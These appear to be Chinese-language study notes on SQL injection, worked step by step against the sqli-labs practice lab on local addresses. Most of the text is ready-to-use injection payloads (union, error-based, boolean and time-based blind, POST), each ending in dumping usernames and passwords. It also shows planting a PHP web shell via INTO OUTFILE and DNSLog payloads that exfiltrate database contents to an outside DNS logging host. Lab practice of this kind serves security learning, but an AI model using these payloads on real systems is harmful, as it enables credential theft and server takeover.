# 	SQL注入

## SQL注入基础

### 什么是SQL注入

在保证SQL语句能被正确执行的情况下，构造一条精巧的语句，来达到查询想要要的信息的目的

### SQL注入分类

+ 字符型
+ 数字型
+ Union注入
+ 报错注入
+ 布尔注入
+ 时间盲注
+ 宽字节注入

### SQL注入常见闭合方式

```
'  "  ')  ")
```

### SQL注入常见注释方式

```
#  %23  --  --+  --'  --
```

## information_schema 介绍

### 拿到表名和列名

information_schema 有三张关键表：

+ `information_schema.schemata`：存储了整个数据库中的所有数据库名

  + 关键字段：

    + `schema_name`：数据库名

    演示：

    ```
    mysql> select schema_name from information_schema.schemata;
    +--------------------+
    | schema_name        |
    +--------------------+
    | information_schema |
    | intruder           |
    | mysql              |
    | performance_schema |
    | pyspider           |
    | pyuser             |
    | sys                |
    +--------------------+
    7 rows in set (0.00 sec)
    ```

+ `information_schema.tables`：存储了整个数据库中的所有数据表

  + 关键字段：

    + `table_schema`：数据库名
    + `table_name`：数据表名

    演示：

    ```bash
    从 information_schema 查询当前数据库中的所有数据表名
    mysql> select table_name from information_schema.tables where table_schema=database();
    +---------------+
    | table_name    |
    +---------------+
    | scrape_center |
    +---------------+
    1 row in set (0.00 sec)
    ```

+ `information_schema.columns`：存储了整个数据库中的所有列

  + 关键字段：

    + `table_schema`：数据库名
    + `table_name`：数据表名
    + `column_name`：字段名

    演示：

    ```python
    # 查询当前数据库下的 scrape_center 表的所有列名
    mysql> select column_name from information_schema.columns where table_schema=database() and table_name='scrape_center';
    +-------------+
    | column_name |
    +-------------+
    | id          |
    | title       |
    | relese_time |
    | relese_site |
    | synopsis    |
    | score       |
    +-------------+
    6 rows in set (0.00 sec)
    ```

  得到了当前数据库名、当前数据库的所有数据表名、每个数据表的各个字段名，就可以开始做脱库了



## 联合注入-Less-1

> 触发条件：后台将所有查询到的信息原封不动的传到前端显示

### 1、寻找注入点

通过加`'`或者`"`的方式来判断

```
http://192.168.231.129:9001/Less-1/?id=1'
```

![image-20230603194526930](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603194526930.png)

### 2、判断是字符型还是数字型

对注入位置做减法，没报错，则是数字型，报错则是字符型

输入2-1，数字有改变，那么就是数字型注入

```
http://192.168.231.129:9001/Less-1/?id=2-1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603195723281.png" alt="image-20230603195723281" style="zoom:50%;" />

输入2-1，数字没有改变，那么就是字符型注入

```
http://192.168.231.129:9001/Less-2/?id=2-1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603195825570.png" alt="image-20230603195825570" style="zoom:50%;" />

### 3、如果是字符型，判断闭合方式

在注入处插入一个引号看报错信息吗，可以发现是单引号闭合

```
http://192.168.231.129:9001/Less-1/?id=2'
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200039513.png" alt="image-20230603200039513" style="zoom:50%;" />

使用单引号闭合并使用注释符注释掉后面的内容

```
http://192.168.231.129:9001/Less-1/?id=2'%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200153738.png" alt="image-20230603200153738" style="zoom:50%;" />

### 4、判断查询列数

使用`order by`来判断查询的列数

```
http://192.168.231.129:9001/Less-1/?id=2'+order+by+3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200328132.png" alt="image-20230603200328132" style="zoom:50%;" />

这里也可以使用`group by`，这个函数被过滤的机率相对更小

```
http://192.168.231.129:9001/Less-1/?id=2'+group+by+3#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200410818.png" alt="image-20230603200410818" style="zoom:50%;" />

### 5、判断回显位置

使`id=-2`，让数据库查询不到该数据从而返回空，再使用`union`来寻找回显点

```
http://192.168.231.129:9001/Less-1/?id=-2' union select 1,2,3#
```

![image-20230603200446254](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200446254.png)

### 6、获取当前数据库名

```
select database();		// 获取当前数据名
select version();		// 获取当前数据库的版本信息
```

```
http://192.168.231.129:9001/Less-1/?id=-1'+union+select+1,database(),version()#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603203305797.png" alt="image-20230603203305797" style="zoom:50%;" />

### 7、爆破所有数据库名（爆库）

```
http://192.168.231.129:9001/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603213126994.png" alt="image-20230603213126994" style="zoom:50%;" />

### 8、获取当前数据库的所有数据表名（爆表）

```
group_concat()：将查询到的内容放到一行输出
```

```
http://192.168.231.129:9001/Less-1/?id=-1'+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()--+
```

![image-20230603203822792](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603203822792.png)

### 9、获取指定数据表的所有字段名（爆字段）

```
http://192.168.231.129:9001/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603205119326.png" alt="image-20230603205119326" style="zoom:50%;" />

### 10、拖库

小技巧：在`group_concat()`内可以使用`'~'`来分割用户名和密码

```
http://192.168.231.129:9001/Less-1/?id=-1' union select 1,group_concat(username,'~',password),3 from users--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603205548687.png" alt="image-20230603205548687" style="zoom:50%;" />

## 报错注入

> 触发条件：后台将所有报错信息直接显示出来

### 前置知识

```
mysql> create databases ctfsu charset utf8;
mysql> create table xml(doc varchar(150));
Query OK, 0 rows affected (0.01 sec)

mysql> insert into xml values('
    '> <book>
    '> <tittle>A bad boy how to get a girlfriend</tittle>
    '> <author>
    '> <initial>Love</initial>
    '> <surname>benben</surname>
    '> </author>
    '> </book>
    '> ');
Query OK, 1 row affected (0.01 sec)

mysql> insert into xml values('
    '> <book>
    '> <tittle>how to become a bad boy</tittle>
    '> <author>
    '> <initial>hualong</initial>
    '> <surname>Melton</surname>
    '> </author>
    '> </book>
    '> ');
Query OK, 1 row affected (0.00 sec)
```



#### extractvalue() 函数的用法

用于查询XML格式的数据库

##### 格式：

```
select extractvalue(列名, 'XPath表达式') from 表名;
```

```sql
mysql> select extractvalue(doc, 'book/author/surname') from xml;
+------------------------------------------+
| extractvalue(doc, 'book/author/surname') |
+------------------------------------------+
| benben                                   |
| Melton                                   |
+------------------------------------------+
2 rows in set (0.00 sec)
```

##### 注入原理：

当XPath表达式有误的时候就会与原封不动的将错误信息返回，，以此只要保证后面的查询语句成功执行，再通过`~`使XPATH表达式错误，达到信息泄露

```sql
mysql> select extractvalue(doc, '~/book/tittle') from xml;
ERROR 1105 (HY000): XPATH syntax error: '~/book/tittle'

ERROR 1105 (HY000): XPATH syntax error: '~ctfsu'
mysql> select extractvalue(doc, concat(0x7e, (select database()))) from xml;
```

#### updatexml() 函数用法

用于对XML格式的数据进行更新

##### 格式：

```
updatexml(XML_Document, XPATH表达式, new_value)
updatexml(字段, 'XPATH表达式', '新值')
```

```sql
mysql> select updatexml(doc, '/book/tittle', 'jack') from xml;
+-----------------------------------------------------------------------------------------------+
| updatexml(doc, '/book/tittle', 'jack')                                                        |
+-----------------------------------------------------------------------------------------------+
|
<book>
jack
<author>
<initial>Love</initial>
<surname>benben</surname>
</author>
</book>
    |
|
<book>
jack
<author>
<initial>hualong</initial>
<surname>Melton</surname>
</author>
</book>
 |
+-----------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

##### 注入原理

与extractvalue原理相同，当XPATH表达式语法出现错误的时候，返回报错信息并执行select语句

```
mysql> select updatexml(doc, concat(0x7e, (select database())), 'jack') from xml;
ERROR 1105 (HY000): XPATH syntax error: '~ctfsu'
```





#### substring() 函数用法

将指定的字符串进行切割并输出

##### 格式：

```
substring('string', start, length)
substring('目标字符串', 起始位, 长度)
```

##### 示例：

```sql
mysql> select substring('123456789', 1, 3);
+------------------------------+
| substring('123456789', 1, 3) |
+------------------------------+
| 123                          |
+------------------------------+
1 row in set (0.01 sec)

mysql> select substring('123456789', 4, 3);
+------------------------------+
| substring('123456789', 4, 3) |
+------------------------------+
| 456                          |
+------------------------------+
1 row in set (0.00 sec)
```

###  `extractvalue() `注入流程-Less-5

#### 查看数据库名

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(0x7e, concat(0x7e, (select database())))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604163329293.png" alt="image-20230604163329293" style="zoom:50%;" />

#### 查看数据库中的所有数据库名（爆库）

由于显错注入一次最多只能显示30个字符，所以使用`substring()`分批显示

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(schema_name),31,30) from information_schema.schemata)))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604165541233.png" alt="image-20230604165541233" style="zoom:50%;" />

#### 查看所有数据表（爆表）

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database())))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604165700837.png" alt="image-20230604165700837" style="zoom:50%;" />

#### 查看指定数据表的所有字段（爆字段）

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(column_name),1,30) from information_schema.columns where table_schema=database() and table_name='users')))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604165850866.png" alt="image-20230604165850866" style="zoom:50%;" />

#### 查看指定字段的内容（拖库）

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(username,'~',password),1,30) from users)))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604170113859.png" alt="image-20230604170113859" style="zoom:50%;" />

### `updatexml()`注入流程-Less-6

#### 爆库

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(schema_name),1,30) from information_schema.schemata)),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180053106.png" alt="image-20230604180053106" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database())),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180146897.png" alt="image-20230604180146897" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(column_name),1,30) from information_schema.columns where table_schema=database() and table_name='users')),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180238548.png" alt="image-20230604180238548" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(username,'~',password),1,30) from users)),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180324452.png" alt="image-20230604180324452" style="zoom:50%;" />

### `floor()`报错-Less-5

#### 前置知识

##### `rand()`函数

随机生成0-1的小数

```sql
mysql> select rand();
+--------------------+
| rand()             |
+--------------------+
| 0.6128508659199354 |
+--------------------+
1 row in set (0.00 sec)

mysql> select rand();
+-----------------------+
| rand()                |
+-----------------------+
| 0.0016049286365554935 |
+-----------------------+
1 row in set (0.00 sec)
```

##### `rand()*2`

将`rand()`生成的小数*2，随机生成0-2的小数

```sql
mysql> select rand()*2;
+--------------------+
| rand()*2           |
+--------------------+
| 1.6850912512141198 |
+--------------------+
1 row in set (0.00 sec)

mysql> select rand()*2;
+--------------------+
| rand()*2           |
+--------------------+
| 1.4086238605981916 |
+--------------------+
1 row in set (0.00 sec)
```

##### `floor()`函数

向下取整

```sql
mysql> select floor(rand()*2);
+-----------------+
| floor(rand()*2) |
+-----------------+
|               1 |
+-----------------+
1 row in set (0.00 sec)

mysql> select floor(rand()*2);
+-----------------+
| floor(rand()*2) |
+-----------------+
|               0 |
+-----------------+
1 row in set (0.00 sec)
```

##### `ceiling()`函数

向上取整

```sql
mysql> select ceiling(rand()*2);
+-------------------+
| ceiling(rand()*2) |
+-------------------+
|                 2 |
+-------------------+
1 row in set (0.00 sec)

mysql> select ceiling(rand()*2);
+-------------------+
| ceiling(rand()*2) |
+-------------------+
|                 1 |
+-------------------+
```

##### `concat_ws()`函数

按指定格式拼接字符串

###### 格式：

```
concat_ws('指定符号', 字符串1, 字符串2)
```

```sql
mysql> select concat_ws('~',2,3);
+--------------------+
| concat_ws('~',2,3) |
+--------------------+
| 2~3                |
+--------------------+
1 row in set (0.00 sec)
```

也可以利用此函数达到信息泄露

```sql
mysql> select concat_ws('~',(select database()),3);
+--------------------------------------+
| concat_ws('~',(select database()),3) |
+--------------------------------------+
| ctfsu~3                              |
+--------------------------------------+
1 row in set (0.00 sec)
```

##### as 别名

##### group by 排序

##### 完整注入语句

```sql
mysql> select concat_ws('~',(select database()),3) from xml;
+--------------------------------------+
| concat_ws('~',(select database()),3) |
+--------------------------------------+
| ctfsu~3                              |
| ctfsu~3                              |
+--------------------------------------+
2 rows in set (0.00 sec)

mysql> select concat_ws('~',(select database()),3) as a from xml group by a;
+---------+
| a       |
+---------+
| ctfsu~3 |
+---------+
1 row in set (0.00 sec)

mysql> select count(*), concat_ws('~', (select database()), '3') as a from xml group by a;
+----------+---------+
| count(*) | a       |
+----------+---------+
|        2 | ctfsu~3 |
+----------+---------+
1 row in set (0.00 sec)
```

#### 注入流程

##### 查看当前数据库名

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604215659443.png" alt="image-20230604215659443" style="zoom:50%;" />

##### 爆库

如果返回的数据太长，那么就会无法显示报错信息，所以要保证注入的成功执行，需要使用`concat`替换`group_concat`，并使用`limit`限制显示数量

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(schema_name) from information_schema.schemata limit 4,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

![image-20230604223407182](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223407182.png) 

##### 爆表

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223534539.png" alt="image-20230604223534539" style="zoom:50%;" />

##### 爆字段

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223754650.png" alt="image-20230604223754650" style="zoom:50%;" />

##### 拖库

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(username,':',password) from users limit 1,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223918496.png" alt="image-20230604223918496" style="zoom:50%;" />

## 布尔盲注

> 适用于目标站点存在注入点但没有回显的情况

### 注入原理：

通过使用布尔判断是否有正确回显，以达到信息猜测的目的

`and 1=1` 为真，页面正常显示

```
http://192.168.231.129:9001/Less-8/?id=1' and 1=1%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605155931573.png" alt="image-20230605155931573" style="zoom:50%;" />

`and 1=2`为假，页面无回显

```
http://192.168.231.129:9001/Less-8/?id=1' and 1=2%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605160014024.png" alt="image-20230605160014024" style="zoom:50%;" />

### 注入流程-less-8

#### 爆库

爆破当前数据库名的第一个字母：

```
http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select database()),1,1)) = 115%23

http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select database()),第几个数据字母,1)) = 115%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605160159955.png" alt="image-20230605160159955" style="zoom:50%;" />

#### 爆表

爆破当前数据库的第一个数据表的第一个字母

```
1' and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)) = 114%23

1' and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 第几个数据表,1),数据表的第几个字母,1)) = 114%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605190431995.png" alt="image-20230605190431995" style="zoom:50%;" />

#### 爆字段

爆破当前数据库的第一个数据表的第一个字段名

```
http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),1,1)) = 117%23

http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 第几个字段,1),第几个字母,1)) = 117%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605191103672.png" alt="image-20230605191103672" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select concat(username,password) from users limit 1,1),1,1)) = 65%23

http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select concat(username,password) from users limit 第几个用户名和密码,1),第几个字母,1)) = 65%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605195810004.png" alt="image-20230605195810004" style="zoom:50%;" />

## 时间盲注

### 注入原理

> 页面无回显信息但是对`sleep()`关键字没有进行过滤（在布尔注入的基础上加上if判断）

### 前置知识

#### `sleep()`函数

延迟查询的时间

##### 格式：

```
select sleep(秒数);
```

##### 演示：

```
mysql> select sleep(3);
+----------+
| sleep(3) |
+----------+
|        0 |
+----------+
```

#### `if()`函数

if判断函数

##### 格式：

```
if(条件, true, False)
```

##### 演示：

```
mysql> select if(1=1, sleep(0), sleep(3));
+-----------------------------+
| if(1=1, sleep(0), sleep(3)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (0.00 sec)
```

### 注入流程-Less-9

#### 爆破当前数据库名

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select database()),1,1))=115, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select database()),第几个字母,1))=115, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605212337339.png" alt="image-20230605212337339" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 第几个表,1),第几个字母,1))=114, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605212638509.png" alt="image-20230605212638509" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),1,1))=117, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 第几个字段,1),第几个字母,1))=117, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605213017492.png" alt="image-20230605213017492" style="zoom:50%;" />

#### 拖库

如果分析不清楚，可以将`username`和`password`分开

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select concat(username,password) from users limit 1,1),1,1))=65, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select concat(username,password) from users limit 第几个用户名密码,1),第几个字母,1))=65, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605213210996.png" alt="image-20230605213210996" style="zoom:50%;" />

## 文件上传

> 此漏洞要想成功，最好拿到网站的绝对路径

### 前置知识

#### 读写权限查看

```
ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
```



```sql
mysql> show variables like '%secure%';
+--------------------------+-------+
| Variable_name            | Value |
+--------------------------+-------+
| require_secure_transport | OFF   |
| secure_auth              | ON    |
| secure_file_priv         | NULL  |
+--------------------------+-------+
3 rows in set, 1 warning (0.01 sec)
```

#### outfit 函数

对MySQL进行文件写入

```sql
SELECT name, age, email INTO OUTFILE '/path/to/output.txt'
```

### 注入流程-Less-7

==对于此漏洞的复现，Linux文件权限需要给予写权限==

```
http://192.168.231.129:9001/Less-7/?id=1')) UNION SELECT 1,"<?php eval($_POST['cmd']);?>",3 into outfile "/var/www/html/shell.php"%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605225553170.png" alt="image-20230605225553170" style="zoom:50%;" />

蚁剑连接

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605230240610.png" alt="image-20230605230240610" style="zoom:50%;" />

## DNSLog注入

### 注入原理

MySQL的`secure_file_priv`必须为空，允许MySQL对文件进行读写操作，利用域名解析功能，在访问某个域名之前先执行某个SQL指令在通过查看DNS日志文件来访问敏感信息

### 前置知识

#### `load_file()`函数

使用MySQL读取指定文件

##### 格式：

这里的UNC路径相当于Windows文件共享路径：`\\ip address | domain name\file path`

```
load_file("UNC路劲")
```

##### 演示：

```
mysql> select load_file("/var/www/html/Less-7/result.txt");
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| load_file("/var/www/html/Less-7/result.txt")                                                                                                                       |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| ID:1')) UNION SELECT 1,"<?php eval($_POST['cmd']);?>",3 into outfile "shell.php"#
ID:1')) UNION SELECT 1,"<?php eval($_POST['cmd']);?>",3 into outfile "111.php"#
 |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.01 sec)
```

### 免费的DNSLog站点

```
http://dnslog.cn/
http://ceye.io
```

### 注入流程-Less-9

#### 查看当前数据库

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select database()),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162328932.png" alt="image-20230606162328932" style="zoom:50%;" />

#### 爆表

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select table_name from information_schema.tables where table_schema=database() limit 1,1),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162446065.png" alt="image-20230606162446065" style="zoom: 50%;" />

#### 爆字段

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162615997.png" alt="image-20230606162615997" style="zoom: 50%;" />

#### 拖库

这里为了阅读方便，所以将用户名和密码分开查询

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select username from users limit 1,1),".ljr4uu.dnslog.cn/benen")))%23

http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select password from users limit 1,1),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162914855.png" alt="image-20230606162914855" style="zoom:50%;" />

## DNSLog自动注入

### 工具安装

#### Python环境配置

需要用到python2版本，所以这里直接用kali就好

```bash
┌──(pinginglab㉿pinginglab)-[~/DnslogSqlinj-master]
└─$ pip2 install gevent==1.2.2  
┌──(pinginglab㉿pinginglab)-[~/DnslogSqlinj-master]
└─$ pip2 install termcolor  
```

#### DNSLog自动化工具安装

```
下载地址：
https://github.com/ADOOO/DnslogSqlinj
```

#### DNSLog自动化工具配置

配置`config.py `文件

登录 http://ceye.io 将你的域名和Token写进来

```
# DNSlog 设置
 5 APItoken = 'API Token'
 6 DNSurl = 'identifier'
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606165153320.png" alt="image-20230606165153320" style="zoom:50%;" />

### 注入流程-Less-9

`DnslogSqlinj`使用方法于SQLMap几乎一致，使用`({})`标记payload的放置处

```
# 爆库
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" --dbs
# 爆表
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" -D "security" --tables
# 爆字段
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" -D "security" -T "users" --columns
# 拖库
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" -D "security" -T "users" -C "username,password" --dump
```

## POST注入-UNION注入

### 注入原理

POST注入和GET注入的原理相同，只是输入点不同

### 注入流程-Less-11

#### order by函数判断查询列数

查询列数为：2

```
passwd=admin' order by 2#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183034046.png" alt="image-20230606183034046" style="zoom:50%;" />

#### UNION 注入判断回显位

```
passwd=' union select 1,2#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183132284.png" alt="image-20230606183132284" style="zoom:50%;" />

#### 查看当前数据库

```
passwd=' union select 1,database()#&Submit=Submit&uname=admin
```

![image-20230606183211789](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183211789.png)

#### 爆库

```
passwd=' union select 1,group_concat(schema_name) from information_schema.schemata#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183320150.png" alt="image-20230606183320150" style="zoom:50%;" />

#### 爆表

```
passwd=' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183411173.png" alt="image-20230606183411173" style="zoom:50%;" />

#### 爆字段

```
Submit=Submit&passwd='+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_schema=database() and table_name='users'#&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183555732.png" alt="image-20230606183555732" style="zoom:50%;" />

#### 拖库

```
Submit=Submit&passwd='+union+select+1,group_concat(username,':',password)+from users#&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183706465.png" alt="image-20230606183706465" style="zoom:50%;" />

## POST注入-显错注入

### 注入流程-Less-13

#### 查看当前数据库

```
passwd=123') union select count(*),concat_ws("~",(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606184812257.png" alt="image-20230606184812257" style="zoom:50%;" />

#### 爆库

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(schema_name)),1,30) from information_schema.schemata)))#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606185331437.png" alt="image-20230606185331437" style="zoom:50%;" />

#### 爆表

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(table_name)),1,30) from information_schema.tables where table_schema=database())))#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606190000741.png" alt="image-20230606190000741" style="zoom:50%;" />

#### 爆字段

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(column_name)),1,30) from information_schema.columns where table_schema=database() and table_name='users')))#&Submit=Submit&uname=admin
```

